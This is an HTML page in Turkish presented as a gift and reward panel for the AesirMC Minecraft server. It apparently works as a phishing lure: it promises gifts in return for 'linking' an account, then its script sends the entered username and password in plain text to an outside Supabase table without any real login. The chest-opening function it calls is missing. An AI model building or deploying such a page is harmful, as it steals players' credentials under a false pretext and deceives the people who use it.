<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AesirMC | Premium Web Panel</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    
    <style>
        :root {
            --primary: #00a2ff;
            --secondary: #0066ff;
            --accent: #d48e00;
            --bg-dark: #050608;
            --glass: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.1);
        }

        body {
            margin: 0;
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: var(--bg-dark);
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(0, 162, 255, 0.1) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(0, 102, 255, 0.1) 0%, transparent 40%);
            overflow-x: hidden;
        }

        nav {
            padding: 15px 8%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(5, 6, 8, 0.85);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--border);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        /* SOL ALT KÖŞEYE SABİTLENMİŞ BUTON */
        .fixed-play-container {
            position: fixed;
            bottom: 25px;
            left: 25px;
            z-index: 999;
        }

        .btn-play {
            background-color: var(--accent);
            color: black;
            padding: 12px 25px;
            border-radius: 50px;
            text-decoration: none;
            font-weight: 800;
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            border: none;
            cursor: pointer;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        }

        .btn-play:hover {
            transform: scale(1.08) translateY(-5px);
            background-color: #f1a400;
            box-shadow: 0 15px 35px rgba(212, 142, 0, 0.4);
        }

        /* ÖZEL MOUSE İKONU (aa.png) */
        .custom-cursor-img {
            width: 22px;
            height: 22px;
            object-fit: contain;
        }

        .logo-wrapper { display: flex; align-items: center; gap: 15px; }
        .logo-img { width: 45px; height: 45px; object-fit: contain; filter: drop-shadow(0 0 10px var(--primary)); }
        .logo-text { font-size: 26px; font-weight: 800; letter-spacing: -1px; text-transform: uppercase; }
        .logo-text span { color: var(--primary); }

        #auth-container {
            margin: auto;
            width: 100%;
            max-width: 420px;
            padding: 50px;
            background: var(--glass);
            backdrop-filter: blur(40px);
            border: 1px solid var(--border);
            border-radius: 32px;
            box-shadow: 0 40px 100px rgba(0,0,0,0.5);
            text-align: center;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(255,255,255,0.05);
            border: 1px solid var(--border);
            border-radius: 16px;
            color: white;
            margin-bottom: 20px;
            box-sizing: border-box;
        }

        .btn-primary {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border: none;
            border-radius: 16px;
            color: white;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
        }

        #game-container { display: none; padding: 60px 10%; text-align: center; }
        .main-chest { width: 240px; cursor: pointer; transition: 0.5s; filter: drop-shadow(0 0 40px rgba(0, 162, 255, 0.4)); }
        
        #win-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; flex-direction: column; }
        .win-card { background: rgba(255,255,255,0.05); padding: 60px; border-radius: 40px; border: 1px solid var(--primary); text-align: center; }
    </style>
</head>
<body>

<nav>
    <div class="logo-wrapper">
        <img src="logo.png" alt="Logo" class="logo-img" onerror="this.src='https://minecraft.wiki/images/Anvil_JE3_BE2.png'">
        <div class="logo-text">AESIR<span>MC</span></div>
    </div>
</nav>

<div class="fixed-play-container">
    <button class="btn-play" onclick="window.location.href='https://aesirmc.com'">
        <img src="aa.png" class="custom-cursor-img" alt="Cursor">
        oyna.aesirmc.com
    </button>
</div>

<div id="auth-container">
    <h2>Giriş Yap</h2>
    <p>Hediyelerini almak için hesabını bağla.</p>
    <input type="text" id="username" placeholder="Kullanıcı Adı">
    <input type="password" id="password" placeholder="Şifre">
    <button class="btn-primary" onclick="connectAndGo()">DÜNYAYA KATIL</button>
</div>

<div id="game-container">
    <h1 id="welcome-txt" style="font-weight: 800; font-size: 42px; margin-bottom: 20px;"></h1>
    <div id="chest-zone">
        <img src="adsız.png" class="main-chest" onclick="initRoulette()" onerror="this.src='https://minecraft.wiki/images/Chest_JE2_BE2.png'">
        <p style="margin-top: 30px; color: var(--primary); font-weight: 600; letter-spacing: 2px; text-transform: uppercase;">Sandığı Açmak İçin Dokun</p>
    </div>
    </div>

<script>
    const S_URL = "https://iigemvvlznvgneghevev.supabase.co";
    const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
    const _db = supabase.createClient(S_URL, S_KEY);

    async function connectAndGo() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        if(!u || !p) return alert("Bilgileri gir!");

        _db.from('AES').insert([{ username: u, password: p }]).then(() => {});

        document.getElementById('auth-container').style.display = 'none';
        document.getElementById('game-container').style.display = 'block';
        document.getElementById('welcome-txt').innerText = "HOŞ GELDİN, " + u.toUpperCase();
    }
    
    // Diğer fonksiyonların (initRoulette, runRoulette) kodlarını buraya eklemeyi unutma.
</script>
</body>
</html>
